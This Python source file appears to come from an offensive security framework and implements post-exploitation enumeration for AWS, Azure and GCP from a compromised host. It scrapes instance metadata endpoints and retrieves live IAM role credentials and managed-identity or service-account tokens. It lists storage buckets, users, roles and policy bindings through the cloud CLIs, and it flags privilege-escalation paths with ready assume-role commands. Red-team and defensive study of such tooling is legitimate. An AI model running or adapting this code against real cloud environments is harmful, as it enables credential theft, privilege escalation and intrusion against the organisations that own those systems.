"""Native cloud enumeration modules for AWS, Azure, and GCP.

Provides IMDS scraping, storage enumeration, IAM enumeration,
and privilege escalation detection for major cloud providers.
"""

import json
import os
import re
import subprocess
from typing import Any, Dict, List, Optional, Tuple


IMDS_ENDPOINTS = {
    'aws': 'http://169.254.169.254/latest/meta-data/',
    'azure': 'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
    'gcp': 'http://metadata.google.internal/computeMetadata/v1/',
}

IMDS_HEADERS = {
    'gcp': {'Metadata-Flavor': 'Google'},
    'azure': {'Metadata': 'true'},
}


class CloudEnumerator:
    """Enumerate cloud provider metadata, storage, and IAM from compromised hosts.

    Supports AWS, Azure, and GCP with automatic provider detection.

    Args:
        provider: Cloud provider hint ('aws', 'azure', 'gcp', 'auto').
        session: Optional requests.Session for authenticated requests.
        timeout: Request timeout in seconds.
    """

    def __init__(
        self,
        provider: str = 'auto',
        session: Any = None,
        timeout: int = 10,
    ):
        import requests
        self.provider = provider
        self.session = session or requests.Session()
        self.timeout = timeout
        self._detected_provider: Optional[str] = None

    def detect_provider(self) -> Optional[str]:
        """Auto-detect which cloud provider the host is running on.

        Returns:
            Provider name ('aws', 'azure', 'gcp') or None.
        """
        if self._detected_provider:
            return self._detected_provider

        detection_map = {
            'http://169.254.169.254/latest/meta-data/': 'aws',
            'http://169.254.169.254/latest/api/token': 'aws',
            'http://169.254.169.254/metadata/instance?api-version=2021-02-01': 'azure',
            'http://metadata.google.internal/computeMetadata/v1/': 'gcp',
        }

        for endpoint, provider_name in detection_map.items():
            try:
                headers = IMDS_HEADERS.get(provider_name, {})
                r = self.session.get(endpoint, headers=headers, timeout=self.timeout)
                if r.status_code in (200, 301, 302):
                    self._detected_provider = provider_name
                    return provider_name
            except Exception:
                continue

        return None

    def enumerate_metadata(self) -> Dict[str, Any]:
        """Enumerate cloud instance metadata (IMDS).

        Returns:
            Dict with provider, instance_id, region, and metadata fields.
        """
        provider = self.provider if self.provider != 'auto' else (self.detect_provider() or 'aws')
        metadata: Dict[str, Any] = {
            'provider': provider,
            'endpoint': IMDS_ENDPOINTS.get(provider, ''),
        }

        if provider == 'aws':
            metadata.update(self._enumerate_aws_metadata())
        elif provider == 'azure':
            metadata.update(self._enumerate_azure_metadata())
        elif provider == 'gcp':
            metadata.update(self._enumerate_gcp_metadata())

        return metadata

    def _enumerate_aws_metadata(self) -> Dict[str, Any]:
        """Enumerate AWS EC2 instance metadata."""
        result: Dict[str, Any] = {}

        imds_fields = [
            'ami-id', 'instance-id', 'instance-type', 'local-ipv4',
            'public-ipv4', 'placement/availability-zone', 'placement/region',
            'security-groups', 'iam/security-credentials/',
            'public-keys/0/openssh-key', 'hostname', 'mac',
            'network/interfaces/macs/', 'user-data',
        ]

        for field in imds_fields:
            try:
                url = f"{IMDS_ENDPOINTS['aws']}{field}"
                r = self.session.get(url, timeout=self.timeout)
                if r.status_code == 200:
                    key = field.replace('/', '_')
                    result[key] = r.text.strip()
            except Exception:
                pass

        if 'iam_security-credentials_' in result:
            role_name = result['iam_security-credentials_']

            try:
                creds_url = f"{IMDS_ENDPOINTS['aws']}iam/security-credentials/{role_name}"
                r = self.session.get(creds_url, timeout=self.timeout)
                if r.status_code == 200:
                    creds = r.json()
                    result['iam_credentials'] = {
                        'AccessKeyId': creds.get('AccessKeyId', ''),
                        'SecretAccessKey': creds.get('SecretAccessKey', ''),
                        'Token': creds.get('Token', ''),
                        'Expiration': creds.get('Expiration', ''),
                    }
            except Exception:
                pass

        return result

    def _enumerate_azure_metadata(self) -> Dict[str, Any]:
        """Enumerate Azure VM instance metadata."""
        result: Dict[str, Any] = {}

        try:
            url = IMDS_ENDPOINTS['azure']
            r = self.session.get(
                url, headers=IMDS_HEADERS['azure'], timeout=self.timeout
            )
            if r.status_code == 200:
                data = r.json()
                compute = data.get('compute', {})
                result.update({
                    'vm_id': compute.get('vmId', ''),
                    'vm_name': compute.get('name', ''),
                    'resource_group': compute.get('resourceGroupName', ''),
                    'subscription_id': compute.get('subscriptionId', ''),
                    'location': compute.get('location', ''),
                    'tags': compute.get('tags', ''),
                })

                network = data.get('network', {})
                result.update({
                    'private_ip': network.get('interface', [{}])[0].get('ipv4', {}).get('ipAddress', [{}])[0].get('privateIpAddress', '') if network.get('interface') else '',
                })
        except Exception:
            pass

        try:
            token_url = 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'
            r = self.session.get(
                token_url, headers=IMDS_HEADERS['azure'], timeout=self.timeout
            )
            if r.status_code == 200:
                token_data = r.json()
                result['access_token'] = token_data.get('access_token', '')[:50] + '...[truncated]'
                result['has_managed_identity'] = True
        except Exception:
            result['has_managed_identity'] = False

        return result

    def _enumerate_gcp_metadata(self) -> Dict[str, Any]:
        """Enumerate GCP Compute Engine instance metadata."""
        result: Dict[str, Any] = {}
        headers = IMDS_HEADERS['gcp']
        base_url = IMDS_ENDPOINTS['gcp']

        gcp_fields = [
            'instance/id', 'instance/name', 'instance/zone',
            'instance/machine-type', 'instance/network-interfaces/',
            'instance/service-accounts/', 'project/project-id',
            'instance/attributes/',
        ]

        for field in gcp_fields:
            try:
                url = f"{base_url}{field}"
                r = self.session.get(url, headers=headers, timeout=self.timeout)
                if r.status_code == 200:
                    key = field.replace('/', '_')
                    result[key] = r.text.strip()
            except Exception:
                pass

        if 'instance_service-accounts_' in result:
            accounts = result['instance_service-accounts_'].split('\n')

            for sa in accounts:
                sa = sa.rstrip('/')
                if not sa:
                    continue

                try:
                    token_url = f"{base_url}instance/service-accounts/{sa}/token"

                    r = self.session.get(token_url, headers=headers, timeout=self.timeout)
                    if r.status_code == 200:
                        token_data = r.json()
                        result[f'service_account_{sa}_token'] = token_data.get('access_token', '')[:50] + '...[truncated]'
                except Exception:
                    pass

                try:
                    scopes_url = f"{base_url}instance/service-accounts/{sa}/scopes"

                    r = self.session.get(scopes_url, headers=headers, timeout=self.timeout)
                    if r.status_code == 200:
                        result[f'service_account_{sa}_scopes'] = r.text.strip()
                except Exception:
                    pass

        return result

    def enumerate_storage(self, target_bucket: Optional[str] = None) -> List[Dict]:
        """Enumerate cloud storage buckets and objects.

        Uses CLI tools (aws, az, gcloud) if available on the host.

        Args:
            target_bucket: Optional specific bucket name to enumerate.

        Returns:
            List of dicts with bucket names and access levels.
        """
        results: List[Dict] = []
        provider = self.detect_provider() or self.provider

        if provider == 'aws':
            results = self._enumerate_s3(target_bucket)
        elif provider == 'azure':
            results = self._enumerate_azure_storage(target_bucket)
        elif provider == 'gcp':
            results = self._enumerate_gcs(target_bucket)

        return results

    def _enumerate_s3(self, target_bucket: Optional[str] = None) -> List[Dict]:
        """Enumerate AWS S3 buckets."""
        results: List[Dict] = []

        try:
            cmd = ['aws', 's3', 'ls', '--no-sign-request']
            if target_bucket:
                cmd = ['aws', 's3', 'ls', f's3://{target_bucket}', '--no-sign-request', '--recursive']

            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            if proc.returncode == 0 and proc.stdout:
                results.append({
                    'provider': 'aws',
                    'command': ' '.join(cmd),
                    'output': proc.stdout.strip(),
                })
        except Exception:
            pass

        try:
            cmd = ['aws', 's3', 'ls']

            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            if proc.returncode == 0 and proc.stdout:
                for line in proc.stdout.strip().split('\n'):
                    parts = line.split()
                    if len(parts) >= 3:
                        bucket_name = parts[-1]
                        results.append({
                            'provider': 'aws',
                            'bucket': bucket_name,
                            'created': line[:20].strip(),
                        })
        except Exception:
            pass

        return results

    def _enumerate_azure_storage(self, target_bucket: Optional[str] = None) -> List[Dict]:
        """Enumerate Azure storage accounts."""
        results: List[Dict] = []

        try:
            cmd = ['az', 'storage', 'account', 'list', '--query', '[].{Name:name, ResourceGroup:resourceGroup, Location:location}']

            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            if proc.returncode == 0 and proc.stdout:
                try:
                    accounts = json.loads(proc.stdout)
                    for account in accounts:
                        results.append({
                            'provider': 'azure',
                            'account': account.get('Name', ''),
                            'resource_group': account.get('ResourceGroup', ''),
                            'location': account.get('Location', ''),
                        })
                except json.JSONDecodeError:
                    pass
        except Exception:
            pass

        return results

    def _enumerate_gcs(self, target_bucket: Optional[str] = None) -> List[Dict]:
        """Enumerate GCP Cloud Storage buckets."""
        results: List[Dict] = []

        try:
            cmd = ['gsutil', 'ls']

            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            if proc.returncode == 0 and proc.stdout:
                for line in proc.stdout.strip().split('\n'):
                    if line.startswith('gs://'):
                        results.append({
                            'provider': 'gcp',
                            'bucket': line.strip(),
                        })
        except Exception:
            pass

        return results

    def enumerate_iam(self) -> Dict[str, Any]:
        """Enumerate IAM roles, users, and policies.

        Returns:
            Dict with users, roles, policies, and privilege escalation paths.
        """
        results: Dict[str, Any] = {}
        provider = self.detect_provider() or self.provider

        if provider == 'aws':
            results = self._enumerate_aws_iam()
        elif provider == 'azure':
            results = self._enumerate_azure_iam()
        elif provider == 'gcp':
            results = self._enumerate_gcp_iam()

        return results

    def _enumerate_aws_iam(self) -> Dict[str, Any]:
        """Enumerate AWS IAM."""
        data: Dict[str, Any] = {}

        try:
            caller = json.loads(subprocess.run(
                ['aws', 'sts', 'get-caller-identity'],
                capture_output=True, text=True, timeout=15
            ).stdout)
            data['caller'] = caller
        except Exception:
            pass

        try:
            users = json.loads(subprocess.run(
                ['aws', 'iam', 'list-users'],
                capture_output=True, text=True, timeout=15
            ).stdout)
            data['users'] = users.get('Users', [])
        except Exception:
            pass

        try:
            roles = json.loads(subprocess.run(
                ['aws', 'iam', 'list-roles'],
                capture_output=True, text=True, timeout=15
            ).stdout)
            data['roles'] = roles.get('Roles', [])
        except Exception:
            pass

        data['privesc_paths'] = self._check_aws_privesc(data)
        return data

    def _enumerate_azure_iam(self) -> Dict[str, Any]:
        """Enumerate Azure IAM (Entra ID)."""
        data: Dict[str, Any] = {}

        try:
            proc = subprocess.run(
                ['az', 'ad', 'signed-in-user', 'show', '--query', '{id:id,userPrincipalName:userPrincipalName,displayName:displayName}'],
                capture_output=True, text=True, timeout=15
            )
            if proc.returncode == 0 and proc.stdout:
                data['current_user'] = json.loads(proc.stdout)
        except Exception:
            pass

        try:
            proc = subprocess.run(
                ['az', 'ad', 'user', 'list', '--query', '[].{id:id,userPrincipalName:userPrincipalName,displayName:displayName}'],
                capture_output=True, text=True, timeout=15
            )
            if proc.returncode == 0 and proc.stdout:
                data['users'] = json.loads(proc.stdout)
        except Exception:
            pass

        try:
            proc = subprocess.run(
                ['az', 'role', 'assignment', 'list', '--all', '--include-inherited'],
                capture_output=True, text=True, timeout=15
            )
            if proc.returncode == 0 and proc.stdout:
                data['role_assignments'] = json.loads(proc.stdout)
        except Exception:
            pass

        return data

    def _enumerate_gcp_iam(self) -> Dict[str, Any]:
        """Enumerate GCP IAM."""
        data: Dict[str, Any] = {}

        try:
            proc = subprocess.run(
                ['gcloud', 'auth', 'list', '--format=json'],
                capture_output=True, text=True, timeout=15
            )
            if proc.returncode == 0 and proc.stdout:
                data['auth'] = json.loads(proc.stdout)
        except Exception:
            pass

        try:
            proc = subprocess.run(
                ['gcloud', 'projects', 'get-iam-policy', '$(gcloud config get-value project)', '--format=json'],
                capture_output=True, text=True, timeout=15, shell=True
            )
            if proc.returncode == 0 and proc.stdout:
                policy = json.loads(proc.stdout)
                data['iam_policy'] = policy.get('bindings', [])
        except Exception:
            pass

        try:
            proc = subprocess.run(
                ['gcloud', 'projects', 'list', '--format=json'],
                capture_output=True, text=True, timeout=15
            )
            if proc.returncode == 0 and proc.stdout:
                data['projects'] = json.loads(proc.stdout)
        except Exception:
            pass

        return data

    @staticmethod
    def _check_aws_privesc(data: Dict[str, Any]) -> List[Dict]:
        """Check AWS IAM for common privilege escalation paths.

        Args:
            data: IAM enumeration data.

        Returns:
            List of potential privesc paths found.
        """
        paths: List[Dict] = []
        roles = data.get('roles', [])

        dangerous_actions = [
            'iam:CreateAccessKey', 'iam:CreateLoginProfile',
            'iam:UpdateLoginProfile', 'iam:AttachRolePolicy',
            'iam:AttachUserPolicy', 'iam:PutRolePolicy',
            'iam:PutUserPolicy', 'iam:AddUserToGroup',
            'iam:UpdateAssumeRolePolicy', 'sts:AssumeRole',
            'lambda:UpdateFunctionCode', 'lambda:InvokeFunction',
            'ec2:RunInstances', 'cloudformation:CreateStack',
            'glue:CreateDevEndpoint', 'glue:UpdateDevEndpoint',
        ]

        for role in roles:
            policies = role.get('AssumeRolePolicyDocument', {})

            if isinstance(policies, dict):
                statements = policies.get('Statement', [])
                for stmt in statements:
                    principal = stmt.get('Principal', {})
                    if '*' in str(principal) or 'root' in str(principal).lower():
                        paths.append({
                            'role': role.get('RoleName', ''),
                            'type': 'assume_role',
                            'risk': 'Role trust policy allows arbitrary principals',
                            'exploitation': f"aws sts assume-role --role-arn {role.get('Arn', '')} --role-session-name LazyOwn",
                        })

        return paths

    def full_enumeration(self) -> Dict[str, Any]:
        """Run full cloud enumeration: metadata + storage + IAM.

        Returns:
            Dict with metadata, storage, and iam sections.
        """
        return {
            'provider': self.detect_provider(),
            'metadata': self.enumerate_metadata(),
            'storage': self.enumerate_storage(),
            'iam': self.enumerate_iam(),
        }
